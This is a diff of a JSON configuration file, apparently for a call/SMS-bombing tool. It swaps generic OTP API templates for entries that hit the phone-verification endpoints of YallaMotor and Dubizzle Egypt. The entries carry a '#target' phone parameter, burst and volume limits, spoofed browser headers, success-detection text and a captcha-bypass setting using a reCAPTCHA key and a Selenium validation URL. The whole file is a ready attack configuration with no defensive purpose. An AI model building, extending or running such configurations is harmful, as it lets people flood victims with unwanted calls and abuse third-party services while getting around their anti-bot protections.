@@ -1,41 +1,86 @@
 [
   {
-    "name": "MessageCentral",
-    "method": "post",
-    "url": "https://cpaas.messagecentral.com/verification/v3/send",
-    "data": "{\"customerId\": \"YOUR_CUSTOMER_ID\", \"mobileNumber\": \"target_number\", \"flowType\": \"SMS\", \"otpLength\": 4}",
-    "headers": {
-      "authToken": "your_auth_token"
-    }
+    "workerName": "YallaMotor",
+    "workerMode": "CALL",
+    "workerType": "GET",
+    "workerDPC": "60",
+    "workerDPB": "600",
+    "burst": "5",
+    "workerMax": "500",
+    "workerURL": "https://egypt.yallamotor.com/verify-twilio/911959",
+    "workerBypassMethod": "none",
+    "workerStatus": "100",
+    "workerIsActive": "False",
+    
+    "workerPrefix": "",
+    "workerHeader": {
+      "User-Agent": "#userAgent",
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Accept-Encoding": "gzip, deflate",
+      "Connection": "keep-alive",
+      "Sec-Fetch-Dest": "empty",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Site": "same-site",
+      "TE": "trailers",
+      "Content-Type": "application/json;charset=utf-8",
+      "Authorization": "Bearer true",
+      "Pragma": "no-cache",
+      "Cache-Control": "no-cache"
+    },
+    "workerParameters": {
+      "phone": "#target",
+      "channeltype": "call",
+      "locale": "en",
+      "_": "1670163984304"
+    },
+    "workerSuccessText": {
+      "status_code": "200",
+      "status_text": "You will receive an automatic call"
+    },
+    "google_token" : "0",
+    "seleniumBypass" : "0"
   },
   {
-    "name": "CM.com OTP",
-    "method": "post",
-    "url": "https://gw.cmtelecom.com/v1.0/message",
-    "data": "{\"from\": \"YourBrand\", \"to\": \"target_number\", \"body\": \"Your OTP code is 1234\"}",
-    "headers": {
-      "Content-Type": "application/json",
-      "Authorization": "Bearer YOUR_API_KEY"
-    }
-  },
-  {
-    "name": "GoSMSGateway",
-    "method": "post",
-    "url": "https://api.gosmsgateway.com/send",
-    "data": "{\"to\": \"target_number\", \"message\": \"Your OTP: 123456\"}",
-    "headers": {
-      "Content-Type": "application/json",
-      "Authorization": "Bearer YOUR_API_KEY"
-    }
-  },
-  {
-    "name": "OTPSMSAPI",
-    "method": "post",
-    "url": "https://otpsmsapi.com/api/send",
-    "data": "{\"phone\": \"target_number\", \"message\": \"Your OTP code is 123456\"}",
-    "headers": {
-      "Content-Type": "application/json",
-      "apiKey": "YOUR_API_KEY"
-    }
+    "workerName": "Dubizzle",
+    "workerMode": "CALL",
+    "workerType": "POST",
+    "workerDPC": "1",
+    "workerDPB": "5",
+    "burst": "1",
+    "workerMax": "10",
+    "workerURL": "https://auth.dubizzle.com.eg/auth/realms/olx-eg/passwordless-login/phone-number/generate-challenge",
+    "workerBypassMethod": "",
+    "workerStatus": "100",
+    "workerIsActive": "True",
+    "workerPrefix": "+2",
+    "workerHeader": {
+      "Host":"auth.dubizzle.com.eg",
+      "Sec-Ch-Ua": "",
+      "Accept":"application/json",
+      "Content-Type":"application/json",
+      "Sec-Ch-Ua-Mobile":"?0",
+      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+      "Sec-Ch-Ua-Platform":"",
+      "Origin":"https://www.dubizzle.com.eg",
+      "Sec-Fetch-Site":"same-site",
+      "Sec-Fetch-Mode":"cors",
+      "Sec-Fetch-Dest":"empty",
+      "Referer":"https://www.dubizzle.com.eg/",
+      "Accept-Encoding":"gzip, deflate",
+      "Accept-Language":"en-US,en;q=0.9"
+    },
+    "workerParameters": {
+      "client_id":"frontend",
+      "medium":"call",
+      "phone_number":"#target",
+      "captcha":"#captchaToken"
+    },
+    "workerSuccessText": {
+      "status_code": "200",
+      "status_text": "Token"
+    },
+    "google_token" : "6LdijU4iAAAAAPS5LzPDrsUYaessDfxTIPLzqRDh",
+    "seleniumBypass" : "https://www.dubizzle.com.eg/.humbucker/challenge/js/validate"
   }
 ]
